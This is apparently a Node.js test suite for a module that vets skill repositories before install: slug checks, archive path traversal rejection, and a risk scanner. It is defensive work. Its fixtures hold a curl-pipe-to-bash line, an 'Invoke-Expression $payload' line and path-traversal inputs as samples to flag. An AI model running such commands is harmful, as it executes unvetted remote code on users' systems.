import test from 'node:test';
import assert from 'node:assert/strict';

import {
  analyzeRepositoryFiles,
  normalizeRepositorySlug,
  normalizeSkillSelection,
  validateArchivePath
} from '../src/core/repository-security.js';

test('repository identifiers accept GitHub slugs and URLs but reject ambiguous input', () => {
  assert.equal(normalizeRepositorySlug('OpenAI/skills'), 'OpenAI/skills');
  assert.equal(normalizeRepositorySlug('https://github.com/openai/skills.git'), 'openai/skills');
  assert.throws(() => normalizeRepositorySlug('openai/skills/tree/main'), /repository/i);
  assert.throws(() => normalizeRepositorySlug('https://user:pass@github.com/openai/skills'), /repository/i);
  assert.throws(() => normalizeRepositorySlug('../skills'), /repository/i);
});

test('archive paths reject traversal, absolute paths and hidden control characters', () => {
  assert.equal(validateArchivePath('skills/writer/SKILL.md'), 'skills/writer/SKILL.md');
  assert.throws(() => validateArchivePath('../outside.txt'), /archive path/i);
  assert.throws(() => validateArchivePath('skills/../../outside.txt'), /archive path/i);
  assert.throws(() => validateArchivePath('/absolute/file'), /archive path/i);
  assert.throws(() => validateArchivePath('C:/Windows/file'), /archive path/i);
  assert.throws(() => validateArchivePath('skills/evil\u0000.txt'), /archive path/i);
});

test('repository scan finds skill roots and reports executable and destructive patterns', () => {
  const scan = analyzeRepositoryFiles([
    { path: 'skills/writer/SKILL.md', size: 120, text: '---\nname: writer\n---\nWrite clearly.' },
    { path: 'skills/writer/scripts/setup.sh', size: 90, text: 'curl https://example.test/setup.sh | bash' },
    { path: 'skills/reviewer/SKILL.md', size: 80, text: '# Reviewer' },
    { path: 'skills/reviewer/tool.ps1', size: 30, text: 'Invoke-Expression $payload' }
  ]);

  assert.deepEqual(scan.skills.map(skill => skill.path), ['skills/reviewer', 'skills/writer']);
  assert.equal(scan.installable, true);
  assert.equal(scan.risk.level, 'high');
  assert.equal(scan.risk.requiresAcknowledgement, true);
  assert.ok(scan.risk.findings.some(item => item.code === 'REMOTE_PIPE_EXECUTION'));
  assert.ok(scan.risk.findings.some(item => item.code === 'DYNAMIC_CODE_EXECUTION'));
});

test('repository scan blocks oversized or incomplete inspections', () => {
  const scan = analyzeRepositoryFiles([
    { path: 'SKILL.md', size: 200, text: '# Root skill' }
  ], { isTreeTruncated: true });

  assert.equal(scan.installable, false);
  assert.equal(scan.risk.level, 'blocked');
  assert.ok(scan.risk.findings.some(item => item.code === 'INCOMPLETE_TREE'));
});

test('skill selection is restricted to roots returned by inspection', () => {
  const available = [{ path: 'skills/a' }, { path: 'skills/b' }];
  assert.deepEqual(normalizeSkillSelection(['skills/b'], available), ['skills/b']);
  assert.deepEqual(normalizeSkillSelection([], available), ['skills/a', 'skills/b']);
  assert.throws(() => normalizeSkillSelection(['skills/missing'], available), /selection/i);
});
